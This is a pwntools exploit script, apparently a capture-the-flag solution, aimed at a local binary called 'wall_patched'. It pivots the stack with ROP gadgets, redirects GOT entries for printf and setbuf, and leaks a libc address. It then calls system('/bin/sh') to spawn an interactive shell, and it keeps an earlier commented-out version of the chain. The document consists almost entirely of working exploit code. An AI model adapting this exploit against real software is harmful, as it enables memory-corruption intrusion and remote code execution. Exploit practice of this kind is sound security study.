from pwn import *
from icecream import ic

elf = exe = ELF("./wall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x00000000004011b1
b *main
b *0x4011ac
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def i(): return io.interactive()

io = start()


'''
leave_ret = 0x4011d4
# sl(b'a'*4097+p64(elf.got['printf']))
payload = p64(gad(elf, ['ret']))*(((4096 - (0x8*9))//8))
payload += p64(qgad(elf, "rbp"))
payload += p64(elf.got["printf"]+0x80)
payload += p64(0x401196)
payload += p64(qgad(elf, "rbp"))
payload += p64(elf.got["printf"]+0x8)
payload += p64(leave_ret)

sla(b"Message: ", payload)
# sl(b'b'*0x68+p64(elf.sym['main'])+b'c'*0x18)

payload = p64(gad(elf, ['ret']))*((0x80-(8*3))//8)
payload += p64(qgad(elf, "rbp"))
payload += p64(elf.got["printf"]+0x80)
payload += p64(0x00000000004011b1)
sla(b"What is your name? ", payload)

ru("Message from ")
ru("Message from ")
libc.address = uu64(6) - libc.sym['printf']

ic(hex(libc.address))

# payload = p64(gad(elf, ['ret']))*((0x80-(8*3))//8)
# payload += p64(elf.sym['main'])

# sl(b'b'*0x68+p64(elf.sym['main'])+b'c'*0x18)
# sl(p64(elf.sym['main']))
# sla(b"Message: ", b'a')

# payload = p64(gad(elf, ['ret']))*((0x80-(8*3))//8)
payload = p64(qgad(libc, "rdi"))
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(qgad(elf, "rbp"))
payload += p64(elf.bss()+0x800)
payload += p64(libc.sym['system'])
sl(payload)
# # sla(b"Message: ", payload)
# sla(b"What is your name? ", payload)
'''
payload = p64(gad(elf, ['ret']))*(((4096 - (0x8*9))//8))
payload += p64(qgad(elf, "rbp"))
payload += p64(elf.got["setbuf"]+0x80)
payload += p64(0x401196)

sla(b"Message: ", payload)


payload = p64(gad(elf, ['ret']))*((0x80-(8*3))//8)
payload += p64(qgad(elf, "rbp"))
payload += p64(elf.got["printf"]+0x80)
payload += p64(0x00000000004011b1)

sla(b"What is your name? ", payload)

ru("Message from ")
ru("Message from ")
libc.address = uu64(6) - libc.sym['printf']

ic(hex(libc.address))

payload = p64(libc.sym['system'])
payload += p64(elf.sym['main'])
payload += p64(0)*6
payload += p64(libc.sym['_IO_2_1_stdout_'])
payload += p64(0)
payload += p64(libc.sym['_IO_2_1_stdin_'])
payload += p64(0)
payload += p64(next(libc.search(b"/bin/sh\x00")))
sl(payload)
io.interactive()
